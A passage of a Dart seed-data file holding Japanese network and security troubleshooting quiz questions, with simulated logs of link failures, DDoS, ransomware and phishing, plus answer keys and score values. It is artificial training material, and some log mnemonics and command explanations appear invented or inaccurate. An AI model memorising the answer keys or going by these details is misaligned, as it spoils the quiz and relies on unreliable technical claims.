import '../models/question.dart';
import '../models/choice.dart';
import '../models/explanation.dart';

const List<Question> kSeedQuestions = [
  Question(
    id: 'q_l2_001_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_l2_001',
    prompt: '以下のSyslogから何が起きているか選んでください。',
    logLines: [
      'Apr 29 14:23:15 Router-A %OSPF-5-ADJCHG: Process 1, Nbr 10.0.0.2',
      '  on GigabitEthernet0/1 from FULL to DOWN,',
      '  Neighbor Down: Dead timer expired',
      'Apr 29 14:23:16 Router-A %LINK-3-UPDOWN:',
      '  Interface GigabitEthernet0/1, changed state to down',
    ],
    choices: [
      Choice(
        id: 'a', text: 'OSPFの設定パラメータが誤っている',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'OSPF設定ミスなら %OSPF-6-CONFIG 系のログが出ます。Dead timer expiredはタイマー超過です。',
      ),
      Choice(
        id: 'b', text: '物理リンクの断絶によりOSPFネイバーが消失した',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ LINK-3-UPDOWN でリンクダウンが先行し、その結果Dead timerが切れてOSPFネイバーが消失しています。',
      ),
      Choice(
        id: 'c', text: 'BGPセッションが切断された',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ログに %BGP の記述はありません。%OSPFのログを確認してください。',
      ),
      Choice(
        id: 'd', text: 'ルーティングループが発生している',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ループなら %OSPF-4-ROUTE_LOOP や %IP-4-DUPADDR 系のログが出ます。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'GigabitEthernet0/1 が物理的にダウンし（LINK-3-UPDOWN）、'
          'その結果OSPFのDead timerが切れてネイバー関係がFULL→DOWNに遷移した。'
          '物理障害がL3プロトコルに波及した典型的なパターン。',
      nextActions: [
        '対向機器のポート状態を確認する（show interfaces）',
        'ケーブルの物理的な接続・LEDランプを確認する',
        'エラーカウンターを確認する（input/output errors, CRC）',
        'OSPFネイバー状態を確認する（show ip ospf neighbor）',
      ],
      relatedCommands: [
        'show interfaces GigabitEthernet0/1',
        'show ip ospf neighbor',
        'show log | include GigabitEthernet0/1',
        'show ip route ospf',
      ],
      studyReference: 'CCNA: ネットワーク障害のトラブルシューティング / OSPFネイバー状態遷移',
    ),
  ),
  Question(
    id: 'q_l2_001_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_l2_001',
    prompt:
        '物理リンクダウンを確認した。次にとるべき行動はどれですか？\n'
        '（状況: 深夜のオンコール対応・現地担当者は呼出可能）',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: 'まずルーターを再起動する',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '再起動は最終手段です。原因を特定せずに再起動すると障害が長期化するリスクがあります。',
      ),
      Choice(
        id: 'b', text: '対向ルーターのポート状態を確認し、迂回経路の有無を確認する',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ まず影響範囲を確認し、迂回経路があれば暫定復旧を優先するのが正しい手順です。',
      ),
      Choice(
        id: 'c', text: 'ISPに障害報告の連絡を入れる',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ISP連絡は必要ですが、まず自社設備側の確認が先です。ISP側障害と断定する前に内部調査が必要です。',
      ),
      Choice(
        id: 'd', text: '現地担当者を呼んでケーブルの確認を依頼する',
        isCorrect: false, scoreImpact: 50,
        feedbackText: '物理確認は重要ですが、まずリモートで確認できることをやってから現地作業を依頼する順序が効率的です。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          '物理障害対応の優先順位: '
          '①リモートで状態確認 → ②迂回経路で暫定復旧 → ③原因調査 → ④恒久対応 → ⑤ISP連絡（必要な場合）。'
          'すぐに再起動・現地作業・ISP連絡は、状況確認より先に実施すると対応が長期化するリスクがある。',
      nextActions: [
        '対向ルーターにSSH接続してポート状態を確認（show interfaces）',
        '本社経由の迂回経路が使えるか確認（show ip route）',
        '迂回可能ならデフォルトルートを変更して暫定復旧',
        'その後ケーブル確認・ISP連絡・根本原因調査',
      ],
      relatedCommands: [
        'show ip route',
        'ip route 0.0.0.0 0.0.0.0 [迂回先]',
        'show interfaces GigabitEthernet0/1',
      ],
      studyReference: 'CCNP ENARSI: 障害対応プロセスとインシデント管理',
    ),
  ),
  Question(
    id: 'q_l3_001_1',
    type: QuestionType.decisionFlow,
    scenarioId: 's_l3_001',
    prompt:
        '深夜23時、監視ツールのアラート：\n'
        '「拠点AからInternet全断」\n\n'
        '最初にすることはどれですか？',
    logLines: [
      '23:04:11 [ALERT] Host: branch-A-router',
      '  Destination: 8.8.8.8 - UNREACHABLE',
      '23:04:11 [INFO] Internal link branch-A → HQ: UP',
    ],
    choices: [
      Choice(
        id: 'a', text: '拠点Aのルーターにsshでログインしてshow ip routeを確認する',
        isCorrect: false, scoreImpact: 50,
        feedbackText: 'SSH接続は有効ですが、まず監視ツールで全体像（どのリンクがdownか）を把握してから絞り込む方が効率的です。',
      ),
      Choice(
        id: 'b', text: '監視ツールでどのリンクがdownしているか全体像を確認する',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ まず全体像を把握することで、原因の絞り込みが効率化されます。内部リンクはUPなのでISP側を疑う。',
      ),
      Choice(
        id: 'c', text: 'ISPにすぐ障害報告を入れる',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ISP側が原因かどうか未確認の段階で連絡するのは早計です。自社設備の確認を先に行います。',
      ),
      Choice(
        id: 'd', text: '拠点Aのルーターを再起動する',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '原因未確認での再起動は厳禁。設定が消える・他の障害を誘発するリスクがあります。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'Internet全断のアラートだが、内部リンク（branch-A→HQ）はUPのまま。'
          'これはISP側のリンクまたはデフォルトルートの消失を示唆している。'
          '全体像を先に把握することで、最短で原因を絞り込める。',
      nextActions: [
        '監視ツールで拠点A-ISP間リンクのステータスを確認',
        '確認後: show ip route でデフォルトルートの有無を確認',
        'ルートが消えていれば迂回経路か手動スタティックルートで暫定復旧',
      ],
      relatedCommands: [
        'show ip route 0.0.0.0',
        'show ip bgp summary',
        'ping 8.8.8.8 source [lo0]',
      ],
      studyReference: 'CCNA: トラブルシューティングの方法論 / OSI参照モデルによる切り分け',
    ),
  ),
  Question(
    id: 'q_l2_002_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_l2_002',
    prompt: '以下のSyslogと状況から、通信できない原因を選んでください。\n'
        '（状況: PC-AとPC-BはSW-1に接続。PCからはpingが通らない）',
    logLines: [
      'SW-1# show vlan brief',
      'VLAN  Name    Status    Ports',
      '1     default active    Gi0/0, Gi0/1',
      '10    Sales   active    (none)',
      '20    Dev     active    (none)',
      '',
      'SW-1# show interfaces Gi0/0 switchport',
      '  Access Mode VLAN: 10 (Sales)',
      '',
      'SW-1# show interfaces Gi0/1 switchport',
      '  Access Mode VLAN: 20 (Dev)',
    ],
    choices: [
      Choice(
        id: 'a', text: 'ケーブルが断線している',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ポートはactive状態でVLANに割り当てられています。物理断線なら show interfaces でdown状態になります。',
      ),
      Choice(
        id: 'b', text: 'PC-AとPC-BがそれぞれVLAN10とVLAN20に別れているため通信できない',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 異なるVLAN間はL3（ルーター or SVIによるルーティング）なしには通信できません。',
      ),
      Choice(
        id: 'c', text: 'スパニングツリーがポートをブロッキングしている',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'STPブロッキングなら show spanning-tree で確認できます。このログからは判断できません。',
      ),
      Choice(
        id: 'd', text: 'IPアドレスが重複している',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'IP重複なら %IP-4-DUPADDR のSyslogが出ます。このログには記載がありません。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'PC-AはVLAN10（Sales）、PC-BはVLAN20（Dev）に割り当てられている。'
          'VLANは論理的なセグメント分離であり、異なるVLAN間はL3ルーティングなしには通信不可。'
          'インターVLANルーティング（Router-on-a-stick またはSVI）の設定が必要。',
      nextActions: [
        '意図したVLAN割り当てかどうか確認する',
        '同じVLANに統一する（または）インターVLANルーティングを設定する',
        'SVIを設定する場合: interface vlan 10 / ip address ...',
      ],
      relatedCommands: [
        'show vlan brief',
        'show interfaces [port] switchport',
        'interface vlan 10',
        'ip routing  (L3スイッチの場合)',
      ],
      studyReference: 'CCNA: VLAN・インターVLANルーティング（Router-on-a-stick・SVI）',
    ),
  ),
  Question(
    id: 'q_sec_001_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_sec_001',
    prompt: '以下のIDSアラートから、発生しているインシデントを選んでください。',
    logLines: [
      '[IDS-ALERT] SYN-FLOOD detected: src=203.0.113.0/24',
      '  dst=10.0.0.1:80, rate=45000pps, duration=00:02:30',
      '[IDS-ALERT] UDP-FLOOD detected: src=198.51.100.0/24',
      '  dst=10.0.0.1:53, rate=12000pps',
      '[INFO] CPU utilization: 98% (threshold: 80%)',
      '[WARN] Connection table: 980000/1000000 entries',
    ],
    choices: [
      Choice(
        id: 'a', text: '内部からの情報漏洩が発生している',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '外部IPからの大量SYN・UDPパケットです。内部漏洩なら内部IPからの外部への不審な通信が見られます。',
      ),
      Choice(
        id: 'b', text: 'DDoS攻撃により、サービスが応答不能になりつつある',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 外部複数IPからのSYN-FLOOD+UDP-FLOODで、CPU98%・接続テーブルが枯渇寸前。DDoSの典型的な状態。',
      ),
      Choice(
        id: 'c', text: 'OSPFルーティングが不安定になっている',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'OSPFログは出ていません。IDSアラートはL4のフラッドを示しています。',
      ),
      Choice(
        id: 'd', text: 'ストレージの容量が不足している',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'Connection tableのエントリ数はメモリ上のセッションテーブルです。ストレージではありません。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          '外部IPからのSYN-FLOOD（ポート80・HTTP）とUDP-FLOOD（ポート53・DNS）が同時発生。'
          'CPUが98%に達し、接続テーブルも98%消費。このまま放置するとサービス完全停止になる。'
          '複数プロトコルでの同時攻撃はDDoSの典型。',
      nextActions: [
        '上流ISPにnull-routing（ブラックホール）依頼を検討',
        '攻撃元IPレンジをACLでブロック（show ip access-lists）',
        '接続テーブルのタイムアウト値を短縮して枯渇を防ぐ',
        '影響範囲（外部公開サービスの応答確認）を把握する',
      ],
      relatedCommands: [
        'ip access-list extended BLOCK-DDOS',
        ' deny ip 203.0.113.0 0.0.0.255 any',
        'show ip access-lists',
        'show processes cpu sorted',
        'clear ip conn (慎重に使用)',
      ],
      studyReference: 'CCNP Security: DDoS軽減手法・ACLによるトラフィックフィルタリング',
    ),
  ),
  Question(
    id: 'q_cap_001_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_cap_001',
    prompt: '以下のインターフェース統計から帯域逼迫の原因として最も可能性が高いものは？',
    logLines: [
      'GigabitEthernet0/0  - WAN (bandwidth: 100Mbps)',
      '  Input rate:  94 Mbps (94% utilization)',
      '  Output rate: 88 Mbps (88% utilization)',
      '  Output drops: 12,458 packets',
      '',
      'Top talkers (last 5min):',
      '  192.168.10.50 → external: 52 Mbps  [dst port: 1935 RTMP]',
      '  192.168.10.51 → external: 28 Mbps  [dst port: 443  HTTPS]',
      '  192.168.10.1  → external:  8 Mbps  [dst port: 80   HTTP]',
    ],
    choices: [
      Choice(
        id: 'a', text: 'WAN回線の物理障害でスループットが低下している',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'インターフェースはUpで帯域を使い切っています。物理障害ではなく帯域の使い切りです。',
      ),
      Choice(
        id: 'b', text: '特定ホストが動画配信（RTMP）で帯域を大量消費している',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 192.168.10.50が52Mbps（全体の55%）をRTMP（ポート1935：動画ストリーミング）で消費しています。',
      ),
      Choice(
        id: 'c', text: 'DNSの名前解決が遅いため全体が遅くなっている',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'DNSトラフィックはTop talkersに出ていません。帯域使用量の統計から原因を判断します。',
      ),
      Choice(
        id: 'd', text: 'ルーターのCPUが高負荷になっている',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'Output dropsはキューからのドロップです。CPU高負荷とは別の現象です（show processes cpuで確認）。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'WAN回線（100Mbps）に対して94%の入力・88%の出力が発生し、パケットドロップが12,458件。'
          'Top talkersを見ると192.168.10.50がRTMP（ポート1935）で52Mbpsを独占。'
          '業務時間帯に動画ストリーミングが帯域を圧迫している可能性が高い。',
      nextActions: [
        '192.168.10.50のユーザーに確認（業務上の動画配信か否か）',
        'QoSポリシーでRTMPトラフィックの帯域を制限する',
        '業務トラフィック（HTTPS）を優先キューに配置する',
        '中長期的にWAN帯域の増速を検討する',
      ],
      relatedCommands: [
        'show interfaces GigabitEthernet0/0',
        'show policy-map interface GigabitEthernet0/0',
        'ip nbar protocol-discovery',
        'show ip nbar protocol-discovery top-n 10',
      ],
      studyReference: 'CCNP ENCOR: QoS設計・帯域制限（Policing）・NBAR',
    ),
  ),

  // ━━ s_l3_001: デフォルトルート消失 / 問2 ━━━━━━━━━━━━━━

  Question(
    id: 'q_l3_001_2',
    type: QuestionType.logChallenge,
    scenarioId: 's_l3_001',
    prompt: '監視ツールで確認: 拠点A→ISP間リンクはdown。\n次に確認するコマンドはどれですか？',
    logLines: [
      '監視ツール確認結果:',
      '  branch-A → ISP: LINK DOWN (since 23:04:08)',
      '  branch-A → HQ:  LINK UP',
      '  HQ → ISP:       LINK UP',
    ],
    choices: [
      Choice(
        id: 'a', text: 'show ip route でデフォルトルートの有無を確認する',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ ISP側リンクダウンでデフォルトルートが消えている可能性が高い。まずルートテーブルを確認します。',
      ),
      Choice(
        id: 'b', text: 'show interfaces でエラーカウンターを確認する',
        isCorrect: false, scoreImpact: 50,
        feedbackText: '物理障害の詳細確認には有効ですが、まず「迂回できるか」を判断するためルートテーブルの確認が優先です。',
      ),
      Choice(
        id: 'c', text: 'show ip bgp summary でBGPセッションを確認する',
        isCorrect: false, scoreImpact: 50,
        feedbackText: 'ISPとBGPを使っている場合は有効ですが、まず show ip route でルートの有無を確認するのが基本手順です。',
      ),
      Choice(
        id: 'd', text: 'ping 8.8.8.8 でインターネット疎通を確認する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '既にInternet全断のアラートが出ています。pingで確認するより、原因特定と迂回経路確認を優先します。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'ISP側リンクがダウンしていることが判明した。'
          'BGP経由でISPからデフォルトルートを受け取っている構成では、'
          'リンクダウンと同時にデフォルトルートがルートテーブルから消える。'
          'show ip route 0.0.0.0 でデフォルトルートが存在するか確認するのが最短の切り分け。',
      nextActions: [
        'show ip route 0.0.0.0 でデフォルトルートの有無を確認',
        'ルートが消えていれば: HQ経由の迂回ルートを手動で設定して暫定復旧',
        '迂回後: ISPにリンク障害の報告を入れる',
        '恒久対応: BGP設定の確認・バックアップ回線の検討',
      ],
      relatedCommands: [
        'show ip route 0.0.0.0',
        'show ip bgp summary',
        'ip route 0.0.0.0 0.0.0.0 [HQ向けネクストホップ]',
        'show interfaces [WAN-IF]',
      ],
      studyReference: 'CCNA: デフォルトルート・BGPとISP接続の基礎',
    ),
  ),

  // ━━ s_l3_002: OSPFネイバー確立しない / 問1 ━━━━━━━━━━━━

  Question(
    id: 'q_l3_002_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_l3_002',
    prompt: '新規追加したRouter-Bのログを確認してください。\n何がOSPFネイバー確立を妨げているか選んでください。',
    logLines: [
      'Router-B# show ip ospf neighbor',
      '(出力なし — ネイバーが存在しない)',
      '',
      'Router-B# show log | include OSPF',
      'Apr 30 09:14:22 %OSPF-4-BAD_HELLO:',
      '  Mismatched hello parameters from 10.0.0.1',
      '  Dead interval: we need 40, they have 20',
    ],
    choices: [
      Choice(
        id: 'a', text: 'ケーブルが接続されていない',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'Helloパケットを受信できているので物理接続はあります。%OSPF-4-BAD_HELLOはHelloパケットを受信した証拠です。',
      ),
      Choice(
        id: 'b', text: 'OSPFのDead Intervalの値が隣接ルーターと一致していない',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ Dead Interval（Router-B: 40sec、隣接: 20sec）が不一致。OSPFネイバーの確立にはHello/Deadタイマーの一致が必須です。',
      ),
      Choice(
        id: 'c', text: 'OSPFエリア番号が異なる',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'エリア番号の不一致なら "Mismatched area" のログが出ます。このログはDead Intervalの不一致を示しています。',
      ),
      Choice(
        id: 'd', text: 'IPアドレスのサブネットが異なる',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'サブネット不一致なら同一セグメントでHelloパケットが届きません。Helloは届いているので、サブネットは合っています。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          '%OSPF-4-BAD_HELLOログは「Helloパケットを受信したが、パラメータが不一致」を示す。'
          'Dead Interval（Router-B: 40sec、隣接: 20sec）が食い違っている。'
          'OSPFのネイバー確立には Hello/Dead タイマーの完全一致が必須（HelloはDeadの1/4が標準）。',
      nextActions: [
        'Router-BのOSPFインターフェースのDead Intervalを確認する',
        '隣接ルーターのDead Intervalと統一する（標準: Dead=40sec, Hello=10sec）',
        '修正後: show ip ospf neighbor でFULL状態になることを確認する',
      ],
      relatedCommands: [
        'show ip ospf interface GigabitEthernet0/0',
        'interface GigabitEthernet0/0',
        ' ip ospf dead-interval 40',
        ' ip ospf hello-interval 10',
        'show ip ospf neighbor',
      ],
      studyReference: 'CCNA: OSPFネイバー確立の8ステップ・Helloパラメータの要件',
    ),
  ),

  // ━━ s_sec_001: DDoS / 問2（判断フロー） ━━━━━━━━━━━━━━━━

  Question(
    id: 'q_sec_001_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_sec_001',
    prompt:
        'DDoS攻撃を確認した（SYN-FLOOD 45000pps、CPU 98%）。\n'
        '最初の対処として最も適切なものはどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: '攻撃元のIPをACLでブロックし、ISPにブラックホール要求を検討する',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ まず自社でACLによる緊急フィルタリングを実施し、同時にISP側でのブラックホール（null-route）を依頼する手順が正しい初動です。',
      ),
      Choice(
        id: 'b', text: 'ルーターを再起動して接続テーブルをクリアする',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '再起動は攻撃が続く限り同じ状態に戻ります。根本対処（フィルタリング）なしに再起動しても効果はなく、ダウンタイムが発生するだけです。',
      ),
      Choice(
        id: 'c', text: '全インターフェースをシャットダウンして完全遮断する',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '正常なユーザーも含めてサービス停止になります。DDoS対応の目的は「正常トラフィックを守りながら攻撃を遮断すること」です。',
      ),
      Choice(
        id: 'd', text: '警察・JPCERT/CCに報告してから対処する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '報告は重要ですが、まず技術的な初動対応が先です。CPUが98%の状態を放置したまま連絡作業を優先するのは順序が逆です。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'DDoS対応の優先順位: '
          '①技術的な緊急対応（ACLフィルタ・ISPへのブラックホール依頼） → '
          '②影響範囲の確認と関係者への報告 → '
          '③恒久対策（DDoS緩和サービス・WAF導入）。'
          '再起動・全断・報告優先はいずれも被害を拡大または長期化させるリスクがある。',
      nextActions: [
        '攻撃元CIDRに対してACLを適用（deny ip 203.0.113.0/24 any）',
        '上流ISPに緊急連絡してnull-route（ブラックホール）を依頼',
        'SYN cookieが有効かどうか確認する（ip tcp adjust-mss）',
        '接続タイムアウトを短縮してテーブル枯渇を軽減',
        '攻撃収束後: JPCERT/CCへの報告・WAF/DDoS緩和サービスの導入検討',
      ],
      relatedCommands: [
        'ip access-list extended BLOCK-DDOS',
        ' deny ip 203.0.113.0 0.0.0.255 any',
        ' permit ip any any',
        'interface GigabitEthernet0/0',
        ' ip access-group BLOCK-DDOS in',
        'show processes cpu sorted',
        'show ip conn count',
      ],
      studyReference: 'CCNP Security: DDoS軽減手法・ACL・null-routing・SYN cookie',
    ),
  ),

  // ━━ s_real_001: VPN脆弱性→ランサムウェア ━━━━━━━━━━━━━━

  Question(
    id: 'q_real_001_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_real_001',
    prompt: '以下のファイアウォールとVPNのSyslogから、何が起きているか判断してください。',
    logLines: [
      'Mar 22 02:14:33 FW-01 %FW-3-CONN: Unusual connection accepted',
      '  src=203.0.113.45 dst=10.0.0.1:443 (SSL-VPN)',
      'Mar 22 02:15:01 VPN-GW %SSL-3-AUTH: Certificate bypass attempt',
      '  CVE-2021-22893: Pre-auth RCE detected',
      'Mar 22 02:18:44 VPN-GW %SYS-2-EXEC: Unknown process started',
      '  cmd=/tmp/.x cmd_args="--encrypt /data"',
      'Mar 22 02:19:15 FileServer-1 %FS-4-ALERT: Mass file rename detected',
      '  pattern: *.locked (3,240 files in 30sec)',
    ],
    choices: [
      Choice(
        id: 'a', text: 'DDoS攻撃によりVPN機器がダウンした',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'DDoS攻撃なら接続数の急増やタイムアウトのログが出ます。CVE番号の記載はRCE（遠隔コード実行）脆弱性の悪用を示します。',
      ),
      Choice(
        id: 'b', text: 'VPN機器の既知脆弱性（CVE）を悪用して侵入し、ランサムウェアが実行された',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ CVE-2021-22893は実在するPulse Secure VPNの脆弱性。侵入後にファイルを暗号化するプロセスが起動し、3,240ファイルが30秒でリネームされています。',
      ),
      Choice(
        id: 'c', text: '内部社員が故意にファイルを削除した',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '外部IP（203.0.113.45）からの接続があります。内部犯行であればVPN経由の外部接続は不要です。',
      ),
      Choice(
        id: 'd', text: 'ファイルサーバのストレージが故障した',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ストレージ故障なら %FS-3-DISK_ERROR 系のログが出ます。*.lockedへの一括リネームはランサムウェアの典型的な動作です。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          '外部からSSL-VPN（443ポート）への接続後、CVE-2021-22893（Pulse Secure VPN の認証前RCE脆弱性）が悪用された。'
          '攻撃者は証明書認証をバイパスしてコマンド実行権限を取得し、ランサムウェアを実行。'
          'ファイルサーバの3,240ファイルが30秒以内に .locked 拡張子に変更された。'
          '2022年の自動車部品メーカーへの攻撃でも同様の手口が使われた。',
      nextActions: [
        '【緊急】VPN機器を即時オフラインにしてネットワークから切り離す',
        '感染したファイルサーバをネットワークから分離する',
        'バックアップが無事かどうか確認する（別ネットワーク保管か）',
        'VPNのファームウェアバージョンとパッチ適用状況を確認する',
        '警察・JPCERT/CCへの報告を行う',
      ],
      relatedCommands: [
        'show version  (VPN機器のファームウェア確認)',
        'show ip conn  (アクティブな接続の確認)',
        'show log | include CVE',
        'netstat -an  (不審なプロセスの通信確認)',
      ],
      studyReference: 'IPA「情報セキュリティ10大脅威2024」1位: ランサムウェア / CVE-2021-22893',
    ),
  ),

  Question(
    id: 'q_real_001_2',
    type: QuestionType.decisionFlow,
    scenarioId: 's_real_001',
    prompt:
        'ランサムウェア感染を確認した。深夜2時20分・IT担当者はあなた1人。\n'
        '次に最優先でとるべき行動はどれですか？',
    logLines: [],
    choices: [
      Choice(
        id: 'a', text: '感染したファイルサーバをシャットダウンして再起動する',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '再起動しても暗号化は止まらず、ログが消える可能性があります。まずネットワーク分離が最優先です。',
      ),
      Choice(
        id: 'b', text: 'VPN機器とファイルサーバをネットワークから物理的に切り離す',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 感染拡大を止めるために「ネットワーク分離」が最優先。LANケーブルを抜く・スイッチポートをシャットダウンするなど物理的に隔離します。',
      ),
      Choice(
        id: 'c', text: 'まず経営層に報告メールを送る',
        isCorrect: false, scoreImpact: 50,
        feedbackText: '報告は重要ですが、感染が拡大し続けている中で報告を先行させると被害が拡大します。技術的な初動対応が先です。',
      ),
      Choice(
        id: 'd', text: '攻撃者へのコンタクト方法を探して身代金額を確認する',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '身代金の確認より感染拡大防止が最優先です。身代金交渉は法執行機関との協議後に判断します。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'ランサムウェアインシデントの初動対応優先順位: '
          '①感染拡大防止（ネットワーク分離）→ ②証拠保全（電源をいきなり落とさない）→ '
          '③経営層報告 → ④専門機関（JPCERT/CC・警察）への連絡 → ⑤復旧検討。',
      nextActions: [
        'LANケーブルを抜く / スイッチポートをshutdownしてネットワーク分離',
        '経営層・法務部門への報告',
        'JPCERT/CCおよび警察サイバー犯罪相談窓口へ連絡',
        'フォレンジック専門会社への調査依頼',
      ],
      relatedCommands: [
        'interface GigabitEthernet0/1',
        ' shutdown  (感染セグメントの切り離し)',
        'show ip route  (感染の経路確認)',
        'show arp  (ARPテーブルで感染端末特定)',
      ],
      studyReference: 'JPCERT/CC「ランサムウェア対応の手引き」',
    ),
  ),

  Question(
    id: 'q_real_001_3',
    type: QuestionType.decisionFlow,
    scenarioId: 's_real_001',
    prompt: 'ネットワーク分離後、バックアップの状況を確認した。\n'
        'バックアップサーバも同一VLANにあり、同様に暗号化されていた。\n'
        'この状況で身代金支払いの判断として最も適切なものは？',
    logLines: [
      'バックアップサーバ確認結果:',
      '  /backup/2024-03-21/*.bak → *.bak.locked (暗号化済)',
      '  /backup/2024-03-20/*.bak → *.bak.locked (暗号化済)',
      '  テープバックアップ: 最終取得 2023-12-31（3ヶ月前）',
    ],
    choices: [
      Choice(
        id: 'a', text: '即座に身代金を支払って復号キーを入手する',
        isCorrect: false, scoreImpact: -50,
        feedbackText: '身代金を払っても復号できる保証はなく（実績50%以下）、支払いが攻撃者の資金源になります。',
      ),
      Choice(
        id: 'b', text: '身代金は支払わず、3ヶ月前のテープバックアップからの復元を開始し、失われたデータの影響調査を並行して行う',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ 身代金不払いが原則。3ヶ月前のバックアップからでも復元を開始し、差分データの影響範囲を並行調査する判断が適切です。',
      ),
      Choice(
        id: 'c', text: '警察に相談してから数週間後に判断する',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '警察相談は必要ですが、数週間の判断遅延は業務停止が長期化します。警察相談と復旧作業を並行して進めます。',
      ),
      Choice(
        id: 'd', text: '攻撃者と交渉して身代金を値引きさせる',
        isCorrect: false, scoreImpact: 0,
        feedbackText: '交渉は専門家（危機管理会社・弁護士）に委ねるべきです。自社での交渉は情報漏洩リスクや法的リスクがあります。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          'バックアップが同一ネットワーク上にあると、ランサムウェアは本体と同時に暗号化することが多い。'
          '「3-2-1バックアップ原則」（3つのコピー・2種類のメディア・1つはオフサイト）が守られていれば防げた。',
      nextActions: [
        'テープバックアップ（3ヶ月前）から復元を開始する',
        '3ヶ月間のデータ差分の業務影響を調査する',
        'JPCERT/CC・警察への報告',
        '将来のために: バックアップをオフラインまたは別ネットワークに分離する',
      ],
      relatedCommands: [
        'rsync -avz /backup/ /offsite-backup/',
      ],
      studyReference: '3-2-1バックアップ原則 / IPA「ランサムウェア対策特設ページ」',
    ),
  ),

  // ━━ s_real_002: フィッシング→AD侵害 ━━━━━━━━━━━━━━━━━━

  Question(
    id: 'q_real_002_1',
    type: QuestionType.logChallenge,
    scenarioId: 's_real_002',
    prompt: '以下のActive DirectoryとメールサーバのSyslogから何が起きているか選んでください。',
    logLines: [
      'Jun 08 09:14:22 MAIL-SV %SMTP-4-PHISH: Suspicious attachment opened',
      '  user=tanaka@corp.example.com file=請求書_2024.exe',
      'Jun 08 09:15:03 DC-01 %AD-4-LOGON: New logon from unusual location',
      '  user=tanaka src=192.168.1.45 auth=NTLM (prev: office-only)',
      'Jun 08 09:18:44 DC-01 %AD-3-PRIV: Privilege escalation detected',
      '  user=tanaka → group=Domain Admins (unauthorized change)',
      'Jun 08 09:22:11 DC-01 %AD-2-CRIT: krbtgt password unchanged >1 year',
      '  Golden Ticket attack risk: HIGH',
    ],
    choices: [
      Choice(
        id: 'a', text: '社員が誤ってファイルを削除した',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ファイル削除とADの特権昇格は別事象です。Domain Adminsへの追加とGolden Ticket警告は深刻な侵害を示しています。',
      ),
      Choice(
        id: 'b', text: 'フィッシングで認証情報を盗んだ攻撃者がADの管理者権限を取得し、Golden Ticket攻撃の危険がある',
        isCorrect: true, scoreImpact: 100,
        feedbackText: '正解！ フィッシングメール（.exe添付）→ NTLMで侵入 → Domain Admins昇格 → krbtgt未更新によるGolden Ticket攻撃リスクという典型的な侵害チェーンです。',
      ),
      Choice(
        id: 'c', text: 'ADサーバのハードウェアが故障した',
        isCorrect: false, scoreImpact: 0,
        feedbackText: 'ハードウェア故障ではユーザーのログオンや権限変更のログは出ません。',
      ),
      Choice(
        id: 'd', text: 'ランサムウェアがADを暗号化した',
        isCorrect: false, scoreImpact: 50,
        feedbackText: '暗号化の記録はまだありません。現時点はAD侵害フェーズです。今すぐ封じ込めれば被害を最小化できます。',
      ),
    ],
    explanation: Explanation(
      whatHappened:
          '典型的なフィッシング→AD侵害チェーン: '
          '①請求書に見せかけた.exeを開封 → ②tanaka氏の認証情報盗取 → '
          '③ADに侵入してDomain Admins権限を不正取得 → ④krbtgtパスワードが1年以上未更新なため'
